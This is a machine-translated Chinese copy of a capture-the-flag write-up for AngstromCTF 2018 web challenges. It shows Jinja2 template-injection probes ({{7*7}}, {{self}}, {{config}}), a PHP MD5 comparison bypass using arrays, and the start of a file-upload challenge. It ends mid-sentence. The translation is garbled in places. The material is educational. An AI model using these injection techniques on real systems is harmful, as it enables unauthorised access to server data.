<html>
<head>
<title>AngstromCTF 2018 WEB Writeups — Part 2</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">AngstromCTF 2018网络评论—第二部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/angstromctf-2018-web-writeups-part-2-6c1ee586aa64?source=collection_archive---------0-----------------------#2018-03-26">https://infosecwriteups.com/angstromctf-2018-web-writeups-part-2-6c1ee586aa64?source=collection_archive---------0-----------------------#2018-03-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="ebb2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">欢迎来到AngstromCTF 2018由Abdelkader [337 HackXore]撰写的文章</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/2a9ed80f4cc6c4bbfb1553dd7d027c6a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Hw1YTxFhZ69Zwu1TbrMhaQ.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">AngstromCTF 2018网络评论—第二部分</figcaption></figure><p id="f9a0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是我文章的第二部分，还有4个问题，让我们来谈谈它们的解决方案。</p><h1 id="a64f" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">马德里布斯[120分]</h1><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lz"><img src="../Images/0c800e3dceabccc9636bf804aeeb65ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qDrjQ1XTtrnoablvFYlleg.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated"><a class="ae ma" href="http://web2.angstromctf.com:7777/" rel="noopener ugc nofollow" target="_blank">http://web2.angstromctf.com:7777/</a></figcaption></figure><p id="7e7e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这个挑战中，参赛者被提供了一个页面。他们必须从下拉列表中选择任何MadLib故事，然后填写表单，通常他们的目标是获得旗帜。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mb"><img src="../Images/3edc38246c12ca5845f658fa26238f84.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_-ZvEiz9Lz2K4eA-GF49rg.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">aCTF MadLib生成器</figcaption></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mc"><img src="../Images/246a447963fb33e36fe862cffac8b04d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8K_66QUS2-oWiAaUN-VL2A.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">aCTF MadLib生成器结果</figcaption></figure><p id="5b85" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我看到这个web应用程序有一个<a class="ae ma" href="http://web2.angstromctf.com:7777/get-source" rel="noopener ugc nofollow" target="_blank">源代码</a>！</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="md me l"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">app.py</figcaption></figure><p id="47f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个用<strong class="jp ir"> <em class="mf"> python语言</em> </strong>开发的web应用，确切的说是用<strong class="jp ir"> <em class="mf"> flask框架(jinja2模板引擎)</em> </strong>。</p><p id="d137" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">读完这段代码，也理解了它，我们必须检测这个错误，而且几乎是flask框架的一个错误！</p><p id="2c18" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们使用<strong class="jp ir"> <em class="mf"> Burp Suite </em> </strong>来读取HTTP请求和响应:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mg"><img src="../Images/029435fa3ba0ea5e690f286846ac5c11.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7JgQI_22xXjivxIoyiJ78w.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">HTTP头(请求)</figcaption></figure><p id="d20a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们转发给<strong class="jp ir"> <em class="mf">中继器</em> </strong> <em class="mf"> : </em></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mh"><img src="../Images/aadfe9fb4766ff82b202fb5bd393bd0e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hiF_DakLPKYlmE0pUUBh4g.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">打嗝组曲中继器</figcaption></figure><p id="a695" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有4个参数(1，2，3，4)，在我搜索了flask框架漏洞后，我发现了一些有趣的资源、文档和相关文章。</p><p id="36b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">事实上，我发现了一个有趣的主题<a class="ae ma" href="http://blog.portswigger.net/2015/08/server-side-template-injection.html" rel="noopener ugc nofollow" target="_blank">是给你的步骤，你应该遵循在flask框架中找到一个模板注入漏洞，然后利用它直到攻击。</a></p><p id="1f7a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是以下模板注入方法:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mi"><img src="../Images/15092bfbc9e93ccd2433bbf09204221b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1160/format:webp/1*Zvtq8YlGrPbXnstuS9HIKw.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">捕捉高效攻击过程的高级方法</figcaption></figure><h2 id="1c35" class="mj lc iq bd ld mk ml dn lh mm mn dp ll jy mo mp lp kc mq mr lt kg ms mt lx mu bi translated"><strong class="ak"> 1。检测</strong></h2><p id="9b3b" class="pw-post-body-paragraph jn jo iq jp b jq mv js jt ju mw jw jx jy mx ka kb kc my ke kf kg mz ki kj kk ij bi translated">该漏洞可能出现在两种不同的上下文中，每种上下文都需要自己的检测方法:明文上下文和代码上下文。</p><p id="3d86" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在尝试了多次之后，基于明文上下文检测方法，我只是通过在第一个参数中注入这个字符串来指出错误:<strong class="jp ir"> {{7*7}} </strong></p><p id="214d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我得到结果后，我得到它是由服务器在第一个参数中执行的！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi na"><img src="../Images/1d51bdcd6d95a1aec020a4beb8484b69.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FhTvh__dMLLsgf9asPW9gA.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">正常情况下作者姓名的参数(1=)</figcaption></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nb"><img src="../Images/d4bee758bffe47a118e3e92d3d9416a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Rse5VM7fM1Vg7rpKy1aYLQ.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">bug已经被检测出来了！</figcaption></figure><p id="5163" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我检测到的是<a class="ae ma" href="https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> <em class="mf">服务器端烧瓶模板注入(SSTI)漏洞</em> </strong> </a></p><h2 id="a1c7" class="mj lc iq bd ld mk ml dn lh mm mn dp ll jy mo mp lp kc mq mr lt kg ms mt lx mu bi translated"><strong class="ak"> 2。识别</strong></h2><p id="16a9" class="pw-post-body-paragraph jn jo iq jp b jq mv js jt ju mw jw jx jy mx ka kb kc my ke kf kg mz ki kj kk ij bi translated">在检测到这是SSTI漏洞后，下一步就是识别使用中的模板引擎。这一步有时就像提交无效语法一样简单，因为模板引擎可能会在产生的错误消息中识别自己。然而，当错误消息被抑制时，这种技术会失败，并且不太适合自动化。相反，我们在<strong class="jp ir"> <em class="mf"> Burp Suite </em> </strong>中使用特定语言有效负载的决策树来自动化这一点。绿色和红色箭头分别代表“成功”和“失败”响应。在某些情况下，单个有效负载可以有多个不同的成功响应—例如，如果没有使用模板语言，探测器<strong class="jp ir"> {{7*'7'}} </strong>将导致<strong class="jp ir">分支</strong>中的<strong class="jp ir"> 49 </strong>，<strong class="jp ir"> 7777777 </strong>中的<strong class="jp ir"> Jinja2、</strong>中的<strong class="jp ir">和【无】。</strong></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nc"><img src="../Images/fe94053abb293f65a9b0be6e40b0d27b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*n1CYqlFhjWS7VpHVszcyqw.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">特定于语言的有效负载树</figcaption></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nd"><img src="../Images/f594f6513b7a8e123a1a2e398cc85160.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dRwaed23bNVCBH3nj3g4CQ.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">试图通过跟踪树来识别这个bug</figcaption></figure><p id="2ffd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好的，我刚刚执行了<strong class="jp ir"> {{7*7}} </strong>然后我执行了<strong class="jp ir"> {{7*'7'}} </strong>，并且基于树；这是<strong class="jp ir">小枝</strong>或<strong class="jp ir">金贾2 </strong>模板引擎！</p><p id="0e1e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们回到<a class="ae ma" href="http://web2.angstromctf.com:7777/get-source" rel="noopener ugc nofollow" target="_blank">源代码</a>，正如我在本文开头提到的；我们可以注意到那是<strong class="jp ir"> Jinja2 </strong>模板引擎。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ne"><img src="../Images/0b36a5326cdf2b169de11235fa516a68.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ztIf2V1KPJ-Zi1JjjCt0AQ.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">这是Jinja2模板引擎</figcaption></figure><p id="81a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我鉴定出那是<a class="ae ma" href="https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> <em class="mf">服务器端烧瓶Jinja2模板注入(SSTI)漏洞</em> </strong> </a>。</p><h2 id="6ca6" class="mj lc iq bd ld mk ml dn lh mm mn dp ll jy mo mp lp kc mq mr lt kg ms mt lx mu bi translated"><strong class="ak"> 3。利用</strong></h2><p id="a6bb" class="pw-post-body-paragraph jn jo iq jp b jq mv js jt ju mw jw jx jy mx ka kb kc my ke kf kg mz ki kj kk ij bi translated">实际上，我在这一步中遵循了三个子步骤:阅读、探索然后攻击。</p><p id="5966" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 3.1改为</strong></p><p id="6bf2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">找到SSTI漏洞并确定模板引擎后的第一步是阅读文档。不应低估这一步骤的重要性；接下来的一个零日漏洞纯粹来自于对文档的仔细阅读。感兴趣的主要领域有:</p><ol class=""><li id="9958" class="nf ng iq jp b jq jr ju jv jy nh kc ni kg nj kk nk nl nm nn bi translated">获取模板作者介绍基本语法的章节。</li><li id="be1f" class="nf ng iq jp b jq no ju np jy nq kc nr kg ns kk nk nl nm nn bi translated">“安全考虑”——开发你正在测试的应用程序的人很可能没有读过这篇文章，它可能包含一些有用的提示。</li><li id="21d7" class="nf ng iq jp b jq no ju np jy nq kc nr kg ns kk nk nl nm nn bi translated">内置方法、函数、过滤器和变量的列表。</li><li id="813e" class="nf ng iq jp b jq no ju np jy nq kc nr kg ns kk nk nl nm nn bi translated">扩展/插件列表—有些可能默认启用。</li></ol><p id="6e36" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 3.2探索</strong></p><p id="e748" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">假设没有漏洞出现，下一步是探索环境，找出您可以访问的确切内容。您可以期望找到模板引擎提供的默认对象，以及开发人员传递给模板的特定于应用程序的对象。许多模板系统公开一个包含范围内所有内容的“自身”或名称空间对象，以及一种列出对象的属性和方法的惯用方式。</p><p id="06c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果没有内置的self对象，你将不得不基于单词表强制使用PHP项目中使用的变量名称，并通过<a class="ae ma" href="https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> <em class="mf"> SecLists </em> </strong> </a>和<strong class="jp ir"> <em class="mf"> Burp入侵者的</em> </strong>单词表集合公开发布。</p><p id="f5de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">开发人员提供的对象很可能包含敏感信息，并且在一个应用程序中的不同模板之间可能会有所不同，所以这个过程应该理想地单独应用于每个不同的模板。</p><p id="04dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 3.3攻击</strong></p><p id="5cb4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此时，您应该对可用的攻击面有了一个明确的概念，并且能够继续使用传统的安全审计技术，检查每个功能是否存在可利用的漏洞。在更广泛的应用程序环境中处理这一点很重要——一些函数可以用来利用特定于应用程序的特性。</p><p id="e12a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">根据最后的子步骤，我基于一些文档和博客利用了这个漏洞，我从这个开始:<a class="ae ma" href="https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html" rel="noopener ugc nofollow" target="_blank">在Flask/Jinja2中探索SSTI，第二部分</a>，我试图选择一个新样式的对象用于访问<em class="mf">对象</em>基类。我使用了一些基于上一篇文章的属性。在注入一些对象和属性后，我注意到了一件事；第一个参数只允许注入12个字节，第二个参数只允许注入24个字节(长度限制)！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/e9445f0f03557c55464991c7340284b5.png" data-original-src="https://miro.medium.com/v2/resize:fit:984/format:webp/1*Y_h0c48njfOblY9vVwwwng.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">马德里布斯的特雷罗卡评论</figcaption></figure><p id="a837" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗯……我必须注入第一个参数，它限制在12个字节允许注入！</p><p id="3cfb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在<a class="ae ma" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections" rel="noopener ugc nofollow" target="_blank"> github </a>中阅读了关于模板注入的主题后，我发现我可以使用一个短的有效载荷(&lt;12字节)来利用它。</p><p id="4bf8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试图在第一个参数中以代码形式执行自身对象:</p><blockquote class="nu nv nw"><p id="0f94" class="jn jo mf jp b jq jr js jt ju jv jw jx nx jz ka kb ny kd ke kf nz kh ki kj kk ij bi translated"><strong class="jp ir"> {{自我}} </strong></p></blockquote><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi oa"><img src="../Images/db146b3ff269614d06b139f727cd2e16.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SWpGMPIKaHQuWEfbss8AXQ.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">{{ self }}已成功执行</figcaption></figure><p id="f6fd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗯…在回应中有一些有趣的事情，我看到自我目标代码已经被成功执行，它也注入了！</p><p id="b2f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们尝试在第一个参数中执行config-object代码:</p><blockquote class="nu nv nw"><p id="f81a" class="jn jo mf jp b jq jr js jt ju jv jw jx nx jz ka kb ny kd ke kf nz kh ki kj kk ij bi translated">{{配置}}</p></blockquote><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ob"><img src="../Images/56fa1fdf112294d64a4d39dea4e5a4e1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1uAaD4hlxLALTcQr7WF8eQ.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">{{ config }}已成功执行</figcaption></figure><p id="da44" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">耶…配置对象也被注入，并且成功地作为代码执行了！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oc"><img src="../Images/959beb47b6641b51e3d3231e1f3550ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1348/format:webp/1*Rye1PTfoJdPrMl9cy3kdtQ.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">马德里布斯的特雷罗卡评论</figcaption></figure><p id="691e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">旗帜为:actf{wow_ur_a_jinja_ninja} </strong></p><h1 id="9ce0" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">MD5[140分]</h1><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi od"><img src="../Images/1eec6dddf8ed7e0edec3e565519d493d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nbd0LWx5AGFpAKN3d00kqA.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">http://web.angstromctf.com:3003/<a class="ae ma" href="http://web.angstromctf.com:3003/" rel="noopener ugc nofollow" target="_blank"/></figcaption></figure><p id="0f41" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这个挑战中，参赛者被提供了一个页面。他们必须找到具有相同md5散列的两个不同的字符串！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi oe"><img src="../Images/edfdac17737116cfbe4dc5015dfd97d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1DcZtfjdqkSAutFv9pHLiA.png"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi of"><img src="../Images/0b1765670bc4f79300f08964d5c991b4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1300/format:webp/1*XcaROgBM4jm6YIxTuGlrOw.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">对不起，你错了。</figcaption></figure><p id="0be9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一个<a class="ae ma" href="http://web.angstromctf.com:3003/src" rel="noopener ugc nofollow" target="_blank">的源代码</a>，读出来:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi og"><img src="../Images/8fd948f5325fbcccdbd455385d406065.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eCxTgtmPhTv9rakLtwN6Lg.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">md5挑战的源代码</figcaption></figure><p id="787c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是PHP，我们也要理解它才能解决这个问题！</p><p id="f3be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我注意到他们通过使用检查条件在<strong class="jp ir"> str1 </strong>和<strong class="jp ir"> str2 </strong>之间进行比较，所以我尝试搜索具有相同md5哈希的两个字符串，并尝试生成base64代码作为字符串，在我放置它们后，我没有得到我需要的！</p><p id="cba9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">过了一段时间，我考虑了发送两个不同值的数组，而不是字符串！</p><p id="6cf5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为什么我想发送两个不同值的数组而不是字符串？</p><p id="b4ca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，让我们看看当我第一次尝试得到错误的消息时发生了什么！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oh"><img src="../Images/29a2b9fea76a077bd9750d7d3ac71f79.png" data-original-src="https://miro.medium.com/v2/resize:fit:1016/format:webp/1*acF6E2yx1dLFyiCSUujNXQ.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">不同的字符串给我不同的MD5哈希(错！)</figcaption></figure><p id="ee81" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好的，如果我们把一个数组和一个字符串连接起来，这就是我们的结果:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/555415d1ec3cb4ea43094befb3be54e9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1228/format:webp/1*hLMKdXMH1OOuPnlskB-2EQ.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">不同的字符串给了我相同的MD5哈希</figcaption></figure><p id="69bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">简单地说，它会给我一个成功的信息！</p><p id="d6e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，让我们在GET请求中发送数组，而不是字符串:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/c795cc40bf317dd46a2119f93b8af098.png" data-original-src="https://miro.medium.com/v2/resize:fit:1330/format:webp/1*zAT98pwmRPBA9bzsZw5jwQ.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">耶……(成功！)</figcaption></figure><p id="2bad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">标志为:actf{but_md5_has_charm} </strong></p><h1 id="a1fc" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">文件存储器[160分]</h1><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lz"><img src="../Images/73faa830bbc1ed47d120fc88a9478f3d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UuRYN05p15OQ2P1vZs_TMg.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated"><a class="ae ma" href="http://web2.angstromctf.com:8899/" rel="noopener ugc nofollow" target="_blank">http://web2.angstromctf.com:8899/</a></figcaption></figure><p id="ae5d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在本次挑战赛中，为参赛者提供了一个注册/登录页面。他们必须注册然后登录:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ok"><img src="../Images/c20f96787ddbb7c5df4356d678df1782.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*upl7MW-emUswgq3h_6rbMA.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">文件存储的登录页面</figcaption></figure><p id="54d1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">他们会从URL找到一个文件上传程序:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ol"><img src="../Images/61ac4507ea9ed5b0f5f69f2814b35953.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Lp8uYFewZxlg1Awks2HGuw.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">从URL上传文件</figcaption></figure><p id="6613" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第一次，我尝试从URL上传任何文件，并使用HTTP头来读取HTTP请求/响应中发生的情况:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi om"><img src="../Images/227e19901689c99d2ebffc33c1fba37f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uRQT2mHRfJ_r6qnZrDuJRQ.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">正在尝试上传文件…</figcaption></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi on"><img src="../Images/c6397d2bcaa59df8bd502e32dcee716b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8FNsvGm6eWYs0b-ypQU0kQ.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">HTTP标头</figcaption></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi om"><img src="../Images/2ee2b85b7ed5c78f9cd9d92a1420fc03.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Zdh30zZut1zaUTp-0EUqyg.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">我们的文件已经上传了！</figcaption></figure><p id="31af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗯……我注意到有:</p><blockquote class="nu nv nw"><p id="6d08" class="jn jo mf jp b jq jr js jt ju jv jw jx nx 